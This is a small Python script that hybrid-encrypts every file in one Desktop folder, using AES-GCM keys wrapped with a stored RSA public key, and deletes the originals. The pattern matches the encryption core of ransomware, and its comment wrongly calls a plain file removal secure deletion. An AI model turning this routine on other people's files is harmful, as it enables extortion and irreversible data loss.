import os
import struct
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# --- Paths ---
FOLDER       = os.path.join(os.path.expanduser("~"), "Desktop", "my_file")
PUBLIC_KEY_F = os.path.join(os.path.dirname(os.path.abspath(__file__)), "public_key.pem")


def load_public_key():
    with open(PUBLIC_KEY_F, "rb") as f:
        return serialization.load_pem_public_key(f.read())


def enc_file(filepath, public_key):
    with open(filepath, "rb") as f:
        plaintext = f.read()

    # 1. Generate a random 256-bit AES key + 96-bit nonce
    aes_key = os.urandom(32)
    nonce   = os.urandom(12)

    
    aesgcm     = AESGCM(aes_key)
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)

    
    enced_aes_key = public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        )
    )

    # 4. Write .enc file:  [4 bytes: enc_key_len][enc_aes_key][12 bytes: nonce][ciphertext]
    enc_path = filepath + ".enc"
    with open(enc_path, "wb") as f:
        key_len = len(enced_aes_key)
        f.write(struct.pack(">I", key_len))   # 4 bytes big-endian
        f.write(enced_aes_key)
        f.write(nonce)
        f.write(ciphertext)

    # 5. Securely delete the original
    os.remove(filepath)
    print(f"  [+] Enced: {os.path.basename(filepath)} → {os.path.basename(enc_path)}")


def main():
    if not os.path.isdir(FOLDER):
        print(f"[!] Folder not found: {FOLDER}")
        return

    public_key = load_public_key()
    files = [f for f in os.listdir(FOLDER)
             if not f.endswith(".enc") and os.path.isfile(os.path.join(FOLDER, f))]

    if not files:
        print("[!] No files to enc")
        return

    print(f"[*] Encing {len(files)} file(s) in: {FOLDER}")
    for fname in files:
        enc_file(os.path.join(FOLDER, fname), public_key)

    print("[✓] Done. All files enced.")


if __name__ == "__main__":
    main()
